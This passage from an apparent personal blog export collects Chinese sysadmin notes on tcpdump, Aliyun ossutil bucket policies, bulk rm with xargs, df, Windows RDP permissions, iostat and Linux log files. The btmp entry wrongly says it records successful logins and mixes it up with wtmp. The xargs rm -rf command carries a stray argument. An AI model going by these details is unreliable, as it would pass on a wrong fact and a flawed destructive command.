class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53666</span>: Flags [S.], cksum <span class="hljs-number">0x9d6a</span> (incorrect -&gt; <span class="hljs-number">0x8556</span>), seq <span class="hljs-number">2479389079</span>, ack <span class="hljs-number">1424840359</span>, win <span class="hljs-number">28960</span>, <span class="hljs-keyword">options</span> [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031562244</span> ecr <span class="hljs-number">2673402874</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">1</span> packet captured<br><span class="hljs-number">2</span> packets received <span class="hljs-keyword">by</span> <span class="hljs-keyword">filter</span><br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure><h4 id="dst-port-端口号"><a href="#dst-port-端口号" class="headerlink" title="dst port 端口号"></a>dst port 端口号</h4><p>指定要抓取目的端口</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@localhost tmp]<span class="hljs-comment"># tcpdump -i eth0 dst port 1234 -v</span><br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.219983</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58829</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0x0c8b</span> (correct), seq <span class="hljs-number">2144206605</span>, win <span class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673454748</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.221641</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58830</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0x8ef6</span> (correct), ack <span class="hljs-number">3988933476</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673454749</span> ecr <span class="hljs-number">1031614118</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">2</span> packets captured<br><span class="hljs-number">3</span> packets received <span class="hljs-keyword">by</span> filter<br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>osstools</title>
    <link href="/2024/04/03/security/secvulns/oss/osstools/"/>
    <url>/2024/04/03/security/secvulns/oss/osstools/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="aliyun"><a href="#aliyun" class="headerlink" title="aliyun"></a>aliyun</h2><h3 id="命令行工具ossutil"><a href="#命令行工具ossutil" class="headerlink" title="命令行工具ossutil"></a>命令行工具ossutil</h3><h4 id="ossutil-安装"><a href="#ossutil-安装" class="headerlink" title="ossutil 安装"></a>ossutil 安装</h4><h5 id="运行命令下载"><a href="#运行命令下载" class="headerlink" title="运行命令下载"></a>运行命令下载</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -o ossutilmac64 https://gosspublic.alicdn.com/ossutil/<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">13</span>/ossutilmac64<br></code></pre></td></tr></table></figure><h5 id="设置可执行权限"><a href="#设置可执行权限" class="headerlink" title="设置可执行权限"></a>设置可执行权限</h5><p>默认权限为 644</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  ossutil ls -al ossutilmac64 <br>-rw-r--r-- <span class="hljs-number"> 1 </span>admin  staff <span class="hljs-number"> 10310832 </span><span class="hljs-number"> 6 </span>22 09:23 ossutilmac64<br></code></pre></td></tr></table></figure><p>修改权限为755，也就是添加可执行权限</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">chmod +x ossutilmac64<br>/<br>chmod<span class="hljs-number"> 755 </span>ossutilmac64<br><br>➜  ossutil ls -al ossutilmac64   <br>-rwxr-xr-x <span class="hljs-number"> 1 </span>admin  staff <span class="hljs-number"> 10310832 </span><span class="hljs-number"> 6 </span>22 09:23 ossutilmac64<br></code></pre></td></tr></table></figure><h5 id="生成配置文件"><a href="#生成配置文件" class="headerlink" title="生成配置文件"></a>生成配置文件</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./ossutilmac64 config <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  ossutil ./ossutilmac64 config<br>该命令创建将一个配置文件，在其中存储配置信息。<br><br><span class="hljs-comment">#建议使用默认，如设置为非默认路径，后期操作命令需要额外指定</span><br>请输入配置文件名,文件名可以带路径(默认为：/Users/admin/.ossutilconfig，回车将使用默认配置文件。如果用户设置为其它文件，在使用命令时需要将--config-file选项设置为该文件）：<br>未输入配置文件，将使用默认配置文件：/Users/admin/.ossutilconfig。<br><br>对于下述配置，回车将跳过相关配置项的设置，配置项的具体含义，请使用<span class="hljs-string">&quot;help config&quot;</span>命令查看。<br>请输入语言(CH/EN，默认为：CH，该配置项将在此次config命令成功结束后生效)：<br>请输入endpoint：oss-cn-hangzhou.aliyuncs.com<br>请输入accessKeyID：selfaccessKeyID<br>请输入accessKeySecret：selfaccessKeySecret<br>请输入stsToken：临时账号权限控制使用，如没有临时账号，忽略直接回车就行<br><br></code></pre></td></tr></table></figure><h4 id="ossutil使用"><a href="#ossutil使用" class="headerlink" title="ossutil使用"></a>ossutil使用</h4><h5 id="获取Bucket-Policy配置"><a href="#获取Bucket-Policy配置" class="headerlink" title="获取Bucket Policy配置"></a>获取Bucket Policy配置</h5><p>.&#x2F;ossutil64 bucket-policy –method get oss:&#x2F;&#x2F;bucketname local_json_file</p><p>bucketname: 需要查看的名称</p><p>local_json_file：非必选参数，结果输出选择，如指定，则会输出到指定文件，如不指定，则会输出在屏幕</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs prolog">➜  ossutil ./ossutilmac64 bucket-policy --method get oss://ctestc<br>&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Principal&quot;</span>: [<br>                <span class="hljs-string">&quot;*&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: [<br>                <span class="hljs-string">&quot;acs:oss:*:1629295033090405:ctestc&quot;</span>,<br>                <span class="hljs-string">&quot;acs:oss:*:1629295033090405:ctestc/*&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Action&quot;</span>: [<br>                <span class="hljs-string">&quot;oss:GetObject&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectAcl&quot;</span>,<br>                <span class="hljs-string">&quot;oss:RestoreObject&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetVodPlaylist&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectVersion&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectVersionAcl&quot;</span>,<br>                <span class="hljs-string">&quot;oss:RestoreObjectVersion&quot;</span><br>            ]<br>        &#125;<br>    ]<br>&#125;<br><br><br><br><span class="hljs-number">0.140599</span>(s) elapsed<br></code></pre></td></tr></table></figure><h5 id="获取其他endpoint数据"><a href="#获取其他endpoint数据" class="headerlink" title="获取其他endpoint数据"></a>获取其他endpoint数据</h5><p>-e endpoint</p><p>.&#x2F;ossutil64 bucket-policy –method get oss:&#x2F;&#x2F;bucketname local_json_file -e enpoint</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs prolog">➜  ossutil ./ossutilmac64 bucket-policy --method get oss://victortop -e oss-cn-beijing.aliyuncs.com     <br>&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Principal&quot;</span>: [<br>                <span class="hljs-string">&quot;202246422411576034&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: [<br>                <span class="hljs-string">&quot;acs:oss:*:1629295033090405:victortop&quot;</span>,<br>                <span class="hljs-string">&quot;acs:oss:*:1629295033090405:victortop/*&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Action&quot;</span>: [<br>                <span class="hljs-string">&quot;oss:GetObject&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectAcl&quot;</span>,<br>                <span class="hljs-string">&quot;oss:RestoreObject&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetVodPlaylist&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectVersion&quot;</span>,<br>                <span class="hljs-string">&quot;oss:GetObjectVersionAcl&quot;</span>,<br>                <span class="hljs-string">&quot;oss:RestoreObjectVersion&quot;</span><br>            ]<br>        &#125;<br>    ]<br>&#125;<br><br><br><span class="hljs-number">0.070789</span>(s) elapsed<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>oss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rm删除大量文件</title>
    <link href="/2024/04/03/yunwei/tips/Linux/rm%E5%88%A0%E9%99%A4%E5%A4%A7%E9%87%8F%E6%96%87%E4%BB%B6/"/>
    <url>/2024/04/03/yunwei/tips/Linux/rm%E5%88%A0%E9%99%A4%E5%A4%A7%E9%87%8F%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>目录下存在很多文件，使用 rm -rf * 命令删除时出现报错信息“-bash: &#x2F;bin&#x2F;rm: Argument list too long”</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>ls | xargs -n 10 rm -rf ls</p><h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><p>ls | xargs -n 10 </p><p>xargs 将 ls 的输出以10个为一组进行划分，每一组中以空格分割</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sinascan__2022-<span class="hljs-number">07</span>-<span class="hljs-number">26</span>_08_37_39_1797228_352146754_report.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_38_49_1797154_843999317_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_39_06_1797156_332961206_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_39_19_1797158_1181784302_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_39_50_1797230_1152914597_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_42_04_1797160_1423651559_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_42_05_1797232_1217770757_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_42_17_1797162_1951926594_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_43_17_1797234_228010804_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_43_28_1797236_1981428778_report</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">sinascan__2022-07-26_08_43_39_1797238_1372310064_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_43_50_1797240_573416805_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_46_05_1797242_757152036_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_47_16_1797244_1169277424_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_47_27_1797246_1802228788_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_49_39_1797248_1935995942_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_54_17_1797164_448377307_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_54_40_1797166_1835940497_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_54_42_1797250_975410091_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_54_56_1797168_825602496_report</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">sinascan__2022-07-26_08_55_11_1797170_1727778636_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_55_24_1797172_1340605402_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_55_57_1797252_1891633674_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_55_58_1797254_899866426_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_57_10_1797256_1505960702_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_58_22_1797258_2052556085_report</span>.<span class="hljs-keyword">xml</span> <span class="hljs-title">sinascan__2022-07-26_08_58_34_1797260_1222102546_report</span>.xml<br></code></pre></td></tr></table></figure><p>将分割的结果作为参数传递给 rm -rf 进行删除</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://blog.chinaunix.net/uid-631981-id-3764070.html">http://blog.chinaunix.net/uid-631981-id-3764070.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查看目录归属磁盘</title>
    <link href="/2024/04/03/yunwei/tips/Linux/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E5%BD%92%E5%B1%9E%E7%A3%81%E7%9B%98/"/>
    <url>/2024/04/03/yunwei/tips/Linux/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E5%BD%92%E5%B1%9E%E7%A3%81%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="查看目录归属磁盘"><a href="#查看目录归属磁盘" class="headerlink" title="查看目录归属磁盘"></a>查看目录归属磁盘</h2><p>df -h [目录]</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">[root@localhost opt]<span class="hljs-comment"># df -h /opt/</span><br><span class="hljs-keyword">File</span><span class="hljs-params">system</span>      Size  Used Avail Use% Mounted <span class="hljs-literal">on</span><br>/dev/sda6       <span class="hljs-number">236</span>G  <span class="hljs-number">125</span>G   <span class="hljs-number">99</span>G  <span class="hljs-number">56</span>% /opt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows2022_localuser_allowremote</title>
    <link href="/2024/04/03/yunwei/tips/Windows/windows2022_localuser_allowremote/"/>
    <url>/2024/04/03/yunwei/tips/Windows/windows2022_localuser_allowremote/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在Windows Server 2022 Standard 系统中新增本地用户后无法远程登录</p><h2 id="远程报错信息"><a href="#远程报错信息" class="headerlink" title="远程报错信息"></a>远程报错信息</h2><p>要远程登录，你需要具有通过远程桌面服务进行登录的权限。默认情况下，远程桌面用户组的成员有这项权限。如果你所属的组没有这项权限，或者远程桌面用户组中已经删除了这项权限，那么需要手动为你授予这一权限</p><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><p>本地用户默认没有远程登录的权限，需要单独设置权限，管理员用户默认拥有远程登录权限</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="“本地用户和组”增加权限"><a href="#“本地用户和组”增加权限" class="headerlink" title="“本地用户和组”增加权限"></a>“本地用户和组”增加权限</h3><p>1、Win+R 输入 “lusrmgr.msc”进入用户和组配置界面</p><p>2、组-&gt;Remote Desktop Users 右击选择“属性”，在成员中增加对应的用户名</p><p>备注：</p><p>该权限增加后远程登录还是会提示同样的错误，需要进行下一步配置</p><h3 id="“本地组策略”增加权限"><a href="#“本地组策略”增加权限" class="headerlink" title="“本地组策略”增加权限"></a>“本地组策略”增加权限</h3><p>1、Win+R 输入 “gpedit.msc”进入本地组策略编辑器界面</p><p>2、计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;允许通过远程桌面服务登录 右击选择“属性”，添加用户或组，添加对应的用户即可</p><p>备注：</p><p>默认只有Administrators</p><p>如果没有上一步，直接执行这一步，会出现“拒绝请求的会话访问”</p><p>完成以上两步操作后，即可远程登录</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>windwos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/01/yunwei/commands/iostat/"/>
    <url>/2024/04/01/yunwei/commands/iostat/</url>
    
    <content type="html"><![CDATA[<p>查看磁盘  </p><p>iostat -kdx 1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># iostat -kdx 1</span><br>Linux 3.10.0-1160.108.1.el7.x86_64 (iZbp1191gh7vw52537lyxrZ) 2024年04月01日 _x86_64_(2 CPU)<br><br>Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               0.01     0.54    0.69    0.93    13.30    22.99    44.85     0.05   28.32    6.07   44.98   0.69   0.11<br><br>Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               0.00     0.00    1.00    0.00     8.00     0.00    16.00     0.00    1.00    1.00    0.00   2.00   0.20<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>log_btmp</title>
    <link href="/2024/04/01/yunwei/log/log_btmp/"/>
    <url>/2024/04/01/yunwei/log/log_btmp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;btmp 主要是系统记录所有登录成功信息</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS、Ubuntu等系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>二进制文件</p><h3 id="文件权限-644"><a href="#文件权限-644" class="headerlink" title="文件权限 644"></a>文件权限 644</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp<br>-rw-rw-r--. 1 root utmp 76800 8月  25 10:08 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp<br></code></pre></td></tr></table></figure><h2 id="日志作用"><a href="#日志作用" class="headerlink" title="日志作用"></a>日志作用</h2><p>last 命令默认数据来源，也就是说默认通过 last 查看数据</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_dmesg</title>
    <link href="/2024/04/01/yunwei/log/log_dmesg/"/>
    <url>/2024/04/01/yunwei/log/log_dmesg/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;dmesg* 主要是系统记录关于开机信息的日志</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><h3 id="文件权限-644"><a href="#文件权限-644" class="headerlink" title="文件权限 644"></a>文件权限 644</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 34655 </span>4月  <span class="hljs-number"> 1 </span>15:30 dmesg<br></code></pre></td></tr></table></figure><h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><h2 id="常见动作的日志"><a href="#常见动作的日志" class="headerlink" title="常见动作的日志"></a>常见动作的日志</h2><h2 id="待研究问题"><a href="#待研究问题" class="headerlink" title="待研究问题"></a>待研究问题</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_message</title>
    <link href="/2024/04/01/yunwei/log/log_message/"/>
    <url>/2024/04/01/yunwei/log/log_message/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;message 主要是用来记录一些设备的 info 信息，也就是核心系统日志文件，一些系统错误，服务错误日志都会写入</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>&#x2F;etc&#x2F;rsyslog.conf</p><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"># <span class="hljs-built_in">Log</span> anything (except mail) of level <span class="hljs-built_in">info</span> <span class="hljs-built_in">or</span> higher.<br># Don&#x27;<span class="hljs-built_in">t</span> <span class="hljs-built_in">log</span> private authentication messages!<br>*.<span class="hljs-built_in">info</span>;mail.none;authpriv.none;cron.none                /<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/messages<br></code></pre></td></tr></table></figure><p>*.info：所有设备的 info  信息</p><p>mail.none  authoriv.none cron.none ：排除设备 mail authoriv cron 的信息</p><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>&#x2F;var&#x2F;log&#x2F;messages</p><h3 id="文件权限-644"><a href="#文件权限-644" class="headerlink" title="文件权限 644"></a>文件权限 644</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-built_in">log</span>]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">lat</span> <span class="hljs-keyword">messages</span><br>-rw-------. <span class="hljs-number">1</span> root root <span class="hljs-number">97922</span> <span class="hljs-number">4</span>月   <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">10</span> <span class="hljs-keyword">messages</span><br></code></pre></td></tr></table></figure><h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><p>时间</p><p>主机名</p><p>类型&#x2F;类型[进程号]</p><p>日志信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> iZbp1191gh7vw52537lyxrZ systemd: Started Session <span class="hljs-number">43</span> of user root.<br><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> iZbp1191gh7vw52537lyxrZ systemd-logind: New session <span class="hljs-number">43</span> of user root.<br><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> 